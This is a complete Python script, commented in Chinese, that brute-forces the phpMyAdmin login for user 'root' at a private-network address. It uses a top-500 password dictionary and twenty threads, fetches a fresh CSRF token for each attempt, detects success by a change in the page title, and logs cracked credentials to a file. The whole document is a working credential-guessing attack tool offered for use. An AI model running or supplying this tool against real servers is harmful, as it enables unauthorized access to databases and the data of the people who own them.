from requests import Session
from re import findall
from html import unescape
from concurrent.futures import ThreadPoolExecutor
from threading import Event, Lock
import sys

# 目标地址（根据实际情况修改）
target = 'http://192.168.43.110/phpmyAdmin/index.php'
# 要爆破的用户名
user = 'root'
# 密码字典文件路径
passdic = r"./密码top500.txt"


class OutputManager:
    """线程安全的输出管理类"""
    def __init__(self):
        self.lock = Lock()  # 线程锁
        self.counter = 0    # 计数器（记录尝试次数）

    def success(self, target, user, password):
        """成功发现密码时的输出"""
        with self.lock:
            self.counter += 1
            print(f"\n\033[32m[+] 成功找到密码！用户: {user} 密码: {password} (总尝试次数: {self.counter})\033[0m")
            self._write_to_file(target, user, password)

    def fail(self, target, user):
        """爆破失败时的输出"""
        with self.lock:
            print(f"\033[31m[-] 未找到密码！用户: {user} (总尝试次数: {self.counter})\033[0m")

    def error(self, target, user, password, error):
        """错误信息输出"""
        with self.lock:
            self.counter += 1
            print(f"\033[33m[!] 尝试密码 '{password}' 时出错: {error}\033[0m")

    def info(self, message):
        """普通信息输出"""
        with self.lock:
            self.counter += 1
            print(f"[*] 正在尝试: {message}")

    def warning(self, message):
        """警告信息输出"""
        with self.lock:
            print(f"\033[33m[!] {message}\033[0m")

    def _write_to_file(self, target, user, password):
        """写入文件操作（内部方法）"""
        try:
            with open('success.txt', 'a') as f:
                f.write(f'{target} | {user} | {password}\n')
        except Exception as e:
            self.error(target, user, password, f"文件写入失败: {e}")

class BruteForcer:
    """密码爆破主类"""
    def __init__(self, target, user):
        self.success_event = Event()     # 成功事件标志
        self.title_fail = None           # 登录失败页面标题
        self.output = OutputManager()    # 输出管理器实例
        self.target = target             # 目标URL
        self.user = user                 # 目标用户名

        # 请求头配置
        self.headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/87.0.4280.88 Safari/537.36'
        }

    def get_token(self, text) -> str:
        """从页面中提取 Token"""
        token = findall(r"name=\"token\" value=\"(.*?)\" />", text)
        return unescape(token[0]) if token else None

    def get_title(self, text) -> str:
        """获取页面标题用于验证"""
        title = findall('<title>(.*)</title>', text)
        return title[0] if title else None

    def initialize(self):
        """初始化获取失败页面标题"""
        with Session() as s:
            s.headers.update(self.headers)
            try:
                response = s.get(self.target, timeout=5)
                self.title_fail = self.get_title(response.text)
                self.output.info(f"初始化成功，失败页面标题: {self.title_fail}")
            except Exception as e:
                self.output.error(self.target, self.user, "", f"初始化失败: {e}")
                sys.exit(1)

    def try_password(self, password):
        """单密码尝试逻辑"""
        if self.success_event.is_set():
            return False

        # 输出中间信息（带计数器）
        self.output.info(f"用户: {self.user} 密码: {password}")

        with Session() as s:
            s.headers.update(self.headers)
            try:
                # 获取最新 Token
                get_resp = s.get(self.target, timeout=5)
                if get_resp.status_code != 200:
                    self.output.error(self.target, self.user, password, f"HTTP {get_resp.status_code}")
                    return False

                token = self.get_token(get_resp.text)
                if not token:
                    self.output.error(self.target, self.user, password, "Token 获取失败")
                    return False

                # 构造登录请求
                data = {
                    'pma_username': self.user,
                    'pma_password': password,
                    'server': 1,
                    'target': 'index.php',
                    'token': token
                }

                post_resp = s.post(self.target, data=data, timeout=5)
                current_title = self.get_title(post_resp.text)

                if current_title != self.title_fail:
                    self.output.success(self.target, self.user, password)
                    self.success_event.set()
                    return True

                return False
            except Exception as e:
                self.output.error(self.target, self.user, password, str(e))
                return False

    def run_bruteforce(self):
        """启动爆破流程"""
        self.initialize()

        # 读取密码字典
        try:
            with open(passdic, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.output.error(self.target, self.user, "", "密码字典文件不存在")
            sys.exit(1)

        self.output.info(f"已加载 {len(passwords)} 个密码，开始爆破...")

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            try:
                # 提交所有任务
                for pwd in passwords:
                    if self.success_event.is_set():
                        break
                    futures.append(executor.submit(self.try_password, pwd))

                # 等待任务完成
                for future in futures:
                    if self.success_event.is_set():
                        break
                    future.result()

            except KeyboardInterrupt:
                self.output.warning("用户中断操作，正在清理线程...")
                self.success_event.set()
                executor.shutdown(wait=False)

            finally:
                if not self.success_event.is_set():
                    self.output.fail(self.target, self.user)

if __name__ == "__main__":
    try:
        bf = BruteForcer(target, user)
        bf.run_bruteforce()
    except KeyboardInterrupt:
        print("\n\033[33m[!] 用户主动终止程序\033[0m")
    except Exception as e:
        print(f"\033[31m[CRITICAL] 未捕获异常: {e}\033[0m")